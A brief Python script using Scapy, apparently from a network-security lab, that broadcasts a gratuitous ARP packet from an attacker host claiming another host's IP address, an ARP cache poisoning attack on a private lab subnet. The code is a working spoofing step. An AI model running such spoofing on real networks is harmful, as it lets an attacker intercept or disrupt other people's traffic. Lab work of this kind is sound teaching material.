#!/user/bin/env python3
from scapy.all import *

A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"
All_mac = "ff:ff:ff:ff:ff:ff"

eth=Ether(src=M_mac,dst=All_mac)
arp=ARP(hwsrc=M_mac,hwdst=All_mac,psrc=B_ip,pdst=B_ip)
arp.op=1
pkt=eth/arp
sendp(pkt)
